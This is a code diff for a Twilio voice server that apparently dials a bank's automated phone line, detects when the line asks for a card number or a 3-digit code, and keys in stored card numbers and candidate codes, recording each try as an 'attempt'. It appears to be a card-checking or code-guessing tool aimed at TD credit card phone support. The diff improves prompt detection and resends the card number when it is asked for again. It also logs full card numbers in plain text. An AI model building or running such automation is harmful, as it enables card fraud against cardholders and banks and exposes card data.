@@ -67,6 +67,44 @@ export const getTwiML = async (req, res) => {
   }
 };
 
+// Helpers for detecting IVR prompts
+const isAskingForCardPrompt = (speech) => {
+  if (!speech) return false;
+  const lower = speech.toLowerCase();
+  // Exclude brand greetings like "TD credit cards"
+  if (lower === 'td credit cards.' || lower === 'td credit cards' || lower.includes('welcome to td')) {
+    return false;
+  }
+  return (
+    lower.includes('enter or say') ||
+    lower.includes('say or enter') ||
+    lower.includes('enter your card') ||
+    lower.includes('say your card') ||
+    lower.includes('enter your 16') ||
+    lower.includes('enter your account') ||
+    lower.includes('please enter') ||
+    lower.includes('card number') ||
+    (lower.includes('enter') && lower.includes('card')) ||
+    (lower.includes('provide') && lower.includes('card'))
+  );
+};
+
+const isAskingForCodePrompt = (speech) => {
+  if (!speech) return false;
+  const lower = speech.toLowerCase();
+  return (
+    lower.includes('test code') ||
+    lower.includes('3 digit') ||
+    lower.includes('three digit') ||
+    lower.includes('passcode') ||
+    lower.includes('security code') ||
+    lower.includes('verification code') ||
+    lower.includes('enter your code') ||
+    lower.includes('say your code') ||
+    (lower.includes('enter') && lower.includes('code'))
+  );
+};
+
 // Stage 2: IVR greeting captured. Send card DTMF ONLY when IVR asks for card number.
 export const handleListenGreeting = async (req, res) => {
   const { attemptId } = req.params;
@@ -87,12 +125,8 @@ export const handleListenGreeting = async (req, res) => {
       result_details: { ...(attempt?.result_details || {}), transcript: currentTranscript }
     }).eq('id', attemptId);
 
-    // Check if IVR is asking for the card number
-    const lower = SpeechResult.toLowerCase();
-    const askingForCard = lower.includes('card') || lower.includes('16') || lower.includes('sixteen')
-      || lower.includes('account number') || lower.includes('card number') || lower.includes('enter your');
-
-    if (askingForCard) {
+    // Check if IVR is explicitly asking for the card number
+    if (isAskingForCardPrompt(SpeechResult)) {
       // ✅ IVR asked for card — send card DTMF now
       await AttemptModel.addLog(attemptId, `IVR asked for card number. Transmitting 16-digit card number over DTMF: ${baseCard}`);
       currentTranscript = currentTranscript ? `${currentTranscript}\nUser (DTMF): ${baseCard}` : `User (DTMF): ${baseCard}`;
@@ -100,7 +134,7 @@ export const handleListenGreeting = async (req, res) => {
         result_details: { ...(attempt?.result_details || {}), transcript: currentTranscript }
       }).eq('id', attemptId);
 
-      const waitSeconds = parseInt(process.env.DTMF_WAIT_DELAY_SECONDS) || 3;
+      const waitSeconds = parseInt(process.env.DTMF_WAIT_DELAY_SECONDS) || 2;
       const gather = twiml.gather({
         input: 'speech',
         speechTimeout: 'auto',
@@ -114,7 +148,7 @@ export const handleListenGreeting = async (req, res) => {
       twiml.redirect({ method: 'POST' }, `${host}/api/call/listen-card/${attemptId}?testCode=${testCode}`);
 
     } else {
-      // ⏳ IVR spoke something else (menu, welcome, etc.) — keep listening
+      // ⏳ IVR spoke something else (brand name, welcome message, etc.) — keep listening for card prompt
       await AttemptModel.addLog(attemptId, `IVR speaking (not card prompt yet). Listening again...`);
       const gather = twiml.gather({
         input: 'speech',
@@ -153,6 +187,7 @@ export const handleListenCard = async (req, res) => {
   const host = process.env.SERVER_URL || `${req.protocol}://${req.get('host')}`;
 
   const { data: attempt } = await supabase.from('attempts').select('test_value, target_test_code, result_details').eq('id', attemptId).single();
+  const baseCard = attempt && attempt.test_value ? attempt.test_value.split(':')[0] : '';
   let currentTranscript = attempt?.result_details?.transcript || '';
   const twiml = new twilio.twiml.VoiceResponse();
 
@@ -176,12 +211,31 @@ export const handleListenCard = async (req, res) => {
       return res.send(twiml.toString());
     }
 
-    // Check if IVR is asking for the test code / PIN
-    const askingForCode = lower.includes('test code') || lower.includes('code') || lower.includes('pin')
-      || lower.includes('3 digit') || lower.includes('three digit') || lower.includes('passcode')
-      || lower.includes('security') || lower.includes('verification');
+    // Check if IVR is repeating/asking for card number again (e.g. if previous DTMF was sent too early)
+    if (isAskingForCardPrompt(SpeechResult)) {
+      await AttemptModel.addLog(attemptId, `IVR requested card number again. Re-transmitting card DTMF: ${baseCard}`);
+      currentTranscript = currentTranscript ? `${currentTranscript}\nUser (DTMF): ${baseCard}` : `User (DTMF): ${baseCard}`;
+      await supabase.from('attempts').update({
+        result_details: { ...(attempt?.result_details || {}), transcript: currentTranscript }
+      }).eq('id', attemptId);
 
-    if (askingForCode) {
+      const gather = twiml.gather({
+        input: 'speech',
+        speechTimeout: 'auto',
+        timeout: 12,
+        action: `${host}/api/call/listen-card/${attemptId}?testCode=${testCode}`,
+        method: 'POST'
+      });
+      gather.pause({ length: 2 });
+      gather.play({ digits: `ww${baseCard}` });
+      gather.pause({ length: 4 });
+      twiml.redirect({ method: 'POST' }, `${host}/api/call/listen-card/${attemptId}?testCode=${testCode}`);
+      res.type('text/xml');
+      return res.send(twiml.toString());
+    }
+
+    // Check if IVR is asking for the test code / PIN
+    if (isAskingForCodePrompt(SpeechResult)) {
       // ✅ IVR asked for test code — send test code DTMF now
       await AttemptModel.addLog(attemptId, `IVR asked for test code. Transmitting 3-digit test code over DTMF: ${testCode}`);
 
@@ -205,7 +259,7 @@ export const handleListenCard = async (req, res) => {
       twiml.redirect({ method: 'POST' }, `${host}/api/call/listen-code/${attemptId}?testCode=${testCode}`);
 
     } else {
-      // ⏳ IVR is still speaking something else (e.g., processing, menu) — keep listening
+      // ⏳ IVR is still speaking something else — keep listening
       await AttemptModel.addLog(attemptId, `IVR speaking (not code prompt yet). Listening again...`);
       const gather = twiml.gather({
         input: 'speech',
